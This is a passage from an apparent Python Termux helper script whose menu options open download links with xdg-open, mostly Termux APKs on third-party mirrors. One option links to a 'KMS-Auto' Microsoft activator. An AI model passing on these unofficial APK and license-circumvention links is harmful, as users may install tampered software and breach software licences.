			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcd3Tgp3uMz5kWkdboNPO1wHWSilcJEJDdMaKzqTlYo0LSgyeT4J1YGPwUgY7PVzRAZH6sEM-8eeSp9UbeSS8idY/rPuEKEMDJ_a-bI-BODOaztQJdFNLatNbl8nrUSP1Bm7pwQSbjBP9GNKsoZ1TNT_ZY41OOIxdMxsUHfuYafVNMALYJc3tVc0zw8Iq88E30pQxQojU6V7HJHQ6e7eX29WP/3ybBCtWsI039iTp8mxqlwAjv7AoC3zarrt7Lg3PPFlhFsGeO9x3l6Z3Yy1-HSw2z/")
			exit("\n\n")
		elif termx == '16':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcebSL7eOPiqmCtj6ho166nsZ0JtFZFlLh1CEBIbfbqmWJuauhOgb31U2GmbAjPCA1NL6KTgYsC1SBlEKBTftSos/ftmwrJLFdmucsaLr4cq0lRRWSyce2HhtXapxAhTcAjoF_PyCFqk1rXl627YAo5_Luwgd9kujso_GN_VoZsFdS6val4bi0HSHv5bKSDrxOfbsvMc5rdp-a0FrJvhXAAq_/jfl4bV3fBOlo3tXG5_DYYYJDZEE4KYCB5q1gl9J8khAwYUHWd38KHv2u3o2esEf5/")
			exit("\n\n")
		elif termx == '17':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcfutwuDYwojmcAOPR9ueKmKr4mlroN_HH7RAUtNm1vCz_c6ja87ZgeyZ_kDSauGlhMi6lLTfLvms1x2ONNSFqGQ/oQLBwCxFvc1QSPO_xQNI92EVMY-dgewbJZTbq8Fz7bv9_4CbzGWnxlGRioHM6bqbDnlzz9ByZLE7yy73oBG0WYSJPdxLJfvoDiMaHkA_3Xb5G6yhCraSA3umFeBd1c16/ZJtk81A_vq8D3H9j_L6gd0gua3wG7AohbEw7e0Y7I2h8RaoNlaWUBYElzRCCDM5g/")
			exit("\n\n")
		elif termx == '18':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcfbwWeGp6qBm1MuwLofHM_xIM5_yHkrLGMtWfW_SDAZ0IsAP8bb74x6vD0ruXZ_rTskjI5IHS2rSsNZT9jlYMt8/4w3PcfrEu3qkRU-7_vF_ZoYTjdi2EK75Qcxe60gS9AiX67wRaRBfh06mIkoJIGmW4U8DjIfyGjKAykp1XKHGHVMuq_QvLwZ6L-wudGkMooMlqtYSgsXkQ5PWB5z3n0pY/vKUyVKIVDyZgg2mBz9s8a9G4MaZ9U1jNlIiWW2TTwqZrnBCFd4qHDgRtCOVknlDJ/")
			exit("\n\n")
		elif termx == '19':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcdtkNQfqOGMQ_iVDjwMSWWFd0UrG7oxoLko8L18ZdqyLCXHLOjz6bsn4PWEAS-t5GSkdSsTcTqKNkJVkCLTSda8/GnH7v_K7GQxJ3sd4H4j4cZrVIO3bhMBM2GFfS6m_oUS2kt-XI2n-FVmQpy-n7HiYz6a8shNQ0azapn0ZYEQI0G287N4I48evJuGBw1Rk2RuLyadySncXkmhKlr9u0rm1/WbYhtlMg-UaHbDQKiWu5dvtnQ_bWpHEhzV-0mJxtWyUOVyJm_Q6XLRb9U8hBq6LE/")
			exit("\n\n")
		elif termx == '20':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcdABJnWrbDlCAJqlptnUqALvbR1DRtmzCAsigvxqOJLf3F-xbFHtHai9gRntorZmnLQHW_mlzhqAyW6Jlj4TXv0/xJ9YyN5TuoMMOx5e3u57YPpELy8A3kXhkuxCOUVQwkNfUzgftmFaAWXq1g4RFMNVQGaNV4FyuR58EIVLFoGK-r8pMWVFRntOcp9ldal0B86ZM_6R6eUT2YEib1AuIDmR/Ofcteop6Qa-iA9RPgs7J506vW1BQ9-qZAReX1zcAg5ag4xu1UbliWT9EDvObhurD/")
			exit("\n\n")
		elif termx == '21':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcd9lVLhBS_gRpOzWlcliyU6Rdt50kJs_YDIr2AhTW-OdTx29_gICtcDAbLsKzZFbQNNt4Prkgv-yk4De3UmkNIY/EH2OQ7AqnCg6M0lZK-vv3T8vcaicrusZS9O-K8bEPQ65o2ro6-aBhyMKVooaL3Bi5EeHws-o76GVIu3hz5Cihv7W9eoMnXJAKd268R7As-G_CTx3r7QWE23iAp57ANni/NkyTQYc3Zz8rgQrGtkwxFxXs6W0Q-KCU7Z185kqTFfoKAX3kGh7SsWSWlBPzidp6/")
			exit("\n\n")
		elif termx == '22':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTceclBZR3xdeMq4EsStrkudy8ubhtfZRAoVYoS9Nnp5vW2QO8KfqYNEtNBEcAcG9vB4qWBW6RyMf7U-P9Csef1Y4/87wmSgEqz6DJMnxuwXIixTgV80JDP_PAzlBRoG3SnduuXKEEhIpU-eAiKm3EZbDL9UUfMuCLb-fa6WofiE0hlNPojYfKRzpToNr7RXwUJOIjApyJHYN6FSBQGk_USvc1/5R5uL20sOBKSJLzzXmAdgbHzAo7HAajGj0l5dnAgM1Ft-juCAJiDUT34l7__rmT-/")
			exit("\n\n")
		elif termx == '23':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcehrWuE1buDVQdZlF8vujmxKvXSBx8GfeFFBhH9CoyozUgQIerPm3ZfYKAwft-w-sUlZT2pLcwFXdE9NF386Vzo/NOSxD8jsABkJGYr4ehZp8HkrSA6ch9xirKQFBlkBJMVZ4D5GuFEErIW0yd8-MH1Ocj99Hvel-KDxwyjbM2kLfWpCuASYHzAJa1H0cFm8kyUG5pFeXUAkbQtLFx5XE63N/ZPStbehIoVFx2dn-rhTIdN-8VNjozpwAJwHKE46jEsVHodf2gIfAWTrexB6bAKxM/")
			exit("\n\n")
		elif termx == '24':
			os.system("xdg-open  https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcf7OmF5Nj4Q_8f319266WAOYbH_yx9nGgJMme9476aA3Dl6uaAP_XSm5SUC6L_NO51J5RI4D2TTlP6RtmdJyNPl/8MX0dO0LbCUWQ5c-4ix0pHMJLA-DmFM6EWvxb_Ym0yFbF88KjV0-DgrAzct6TLNJfYiPwXkuFHIGjqUkZed5n6jAYuLysLyN_ZJKY55PJDPDA0lnX_zy8XPj1CApnxuZ/J8-HomRt-G6yyjUr4od5-fHDByV06saUqI2_CNCH437hjsBRl8R2oGeNOAkmrt4K/")
			exit("\n\n")
		elif termx == '25':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcfWX24QR5eO0KJVvBmUTya0bK6l-yvhHwlssU6qw5s1ac7ChZ4o2jp6_ofLesIvh2zZ5uFFY_9ipsRhNyNDPEwH/deJWc78ddXjr2517vv9EyPUWTwgUnjmZI95g-pkCoZ87if1DO52yDM3UXPTmj0Qr5R6iCnZgmInj9-eHC_J1LPAT_XCtEJlclI7OWuTs2eALxLnkXxcZyVxKCrVB3E1b/M9ni8CQLXImQVZucvwWvOf9GA5YqR8xJxyERxxhOFPpIXCxcRd_hTL0LglNEb97j/")
			exit("\n\n")
		elif termx == '26':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTccRxT-EdyyXEI0aqlreY3LHyEcMoEdfdkiICcvqBpUjCw6BIdjoHJy-P9kOAAUdnwbJjXyYSAYJ1jL4FEpQHaUL/d9MZbpHdF98Wh8_wgVF3WKt_qEg7YDU4V_pdhnNynajyzgEU8CxN28Z-4DIIndlvAQ1wPEYIVC38PUquEkgFq2IYHaAP7sWhLWUy9ZDdKY-gv5vhfuIFkfxhXPYJVOJM/AKshkzDS8ZWU1ZAdN13tP-1_mVToOfflOYVBYamzWB0CGgX4bQH2EUvJJa2fS4Vv/")
			exit("\n\n")
		elif termx == '27':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcd5vRx4N0JxAMrmCysfCqGn7q3kncLkxWdzL1ej9lK5EgdSijaFQKO4PhYCfz5CBUOg_I1LqypvdHH4gDq94pgT/tg_gHEW57s_uT88YqL-jaxmaGk7Aqm6T5jEx0hyA4Tqx-Qv5v4_itYYMxLZN3gRIgGOQq4In8gfNqTeQ9kgructEU54vwjT65e1Oh_ymJQmZTDgATXQII5ozlglUvlS0/OQZtSRVUy8aqYo90ysPRkcU6JmD_M73aHaJbHhvr0h4aDr3OakdCRKAnpKUq31EB/")
			exit("\n\n")
		elif termx == '28':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTccG0Mdt-fvV_KfydDA-jiEIrhmVc2f8PYduyTk7tE_U093jdjDpTjRbyk3vmtKWryBRSnoIXj3gmbqQHNrSEWCQ/UP9bADb5kzV5WytmcD0bGn7oKOcD7AOgaVSy26o49SWCUq8P5BAUaPXPP72sZN1AvH6vzp2IjdlXEmAHP6ghpDnrLjJ5KmtO9FejS7ym9lhadNiJcpcV7y6S7teWR5wc/pk7o8D2-GeO-X5-sAYTRQtuVWgknZPT98WjDfejUv056vrSe9UtwDZl4Sv26mluF/")
			exit("\n\n")
		elif termx == '29':
			os.system("xdg-open https://d-01.aabstatic.com/1120/termux_0.103_androidapksbox.apk")
			exit("\n\n")
		elif termx == '30':
			os.system("xdg-open https://www.gnradar.com/download/Termux.apk")
			exit("\n\n")
		elif termx == '31':
			os.system("xdg-open https://cdn.down-apk.com/com.termux/Termux_0.118.0_apkcombo.com.apk?ecp=Y29tLnRlcm11eC8wLjExOC4wLzExOC41MThkOGEwNDliMzFlZTI4ZTBkZjczZTVmYTIxZjM4NmZjNDY4ODg4LmFwaw==&iat=1647779297&sig=4644450065b456a7140f7e6528b011dd&size=101739523&from=cf&version=latest")
			exit("\n\n")
		
		else:
			help()
	elif sys.argv[1] == "--about" or sys.argv[1] == "-about":
		logo()
		time.sleep(0.5)
		print("[*]  ");time.sleep(0.3)
		print("[*]  ");time.sleep(0.3)
		print("[*]  ");time.sleep(0.3)
		print("[*]  ");time.sleep(0.3)
		print("[*]  ");time.sleep(0.3)
		print("[*]  ");time.sleep(0.3)
		print("[*]  ");time.sleep(0.3)
		print("[*]  ");time.sleep(0.3)
		print("[*]  ");time.sleep(0.3)
		print("[*]  ");time.sleep(0.3)
		print("[*]  ");time.sleep(0.3)
		print("[*]  ");time.sleep(0.3)
		print("[*]  ");time.sleep(0.3)
		print("[*]  ");time.sleep(0.3)
		print("[*]  ");time.sleep(0.3)
		exit("")
	elif sys.argv[1] == "-other" or sys.argv[1] == "--other" or sys.argv[1] == "--commands" or sys.argv[1] == "-commands":
		logo()
		time.sleep(0.5)
		print("[01] Download 2613 User-Agent File ");time.sleep(0.3)
		print("[02] Download All Microsoft Activator [ KMS-Auto ]");time.sleep(0.3)
		print("[03]  ");time.sleep(0.3)
		print("[04]  ");time.sleep(0.3)
		print("[05]  ");time.sleep(0.3)
		print("[06]  ");time.sleep(0.3)
		print("[07]  ");time.sleep(0.3)
		print("[08]  ");time.sleep(0.3)
		print("[09]  ");time.sleep(0.3)
		print("[10]  ");time.sleep(0.3)
		print("[11]  ");time.sleep(0.3)
		print("[12]  ");time.sleep(0.3)
		print("[13]  ");time.sleep(0.3)
		print("[14]  ");time.sleep(0.3)
		otherx = input("\n[*] Choose : ")
		if otherx == '1' or otherx == "01":
			download_ua()
		elif otherx == '2' or otherx == '02':
			os.system("xdg-open https://www.official-kmspico.com/download-kmsauto/")
			exit("\n\n")
		else:
			help()
	elif sys.argv[1] == "--facebook" or sys.argv[1] == "-facebook" or sys.argv[1] == "--fb" or sys.argv[1] == "-fb":
		fb()
	elif sys.argv[1] == "--basic" or sys.argv[1] == "-basic" or sys.argv[1] == "--Basic" or sys.argv[1] == "-BASIC":
		basic_termux()


if __name__=='__main__':
    help()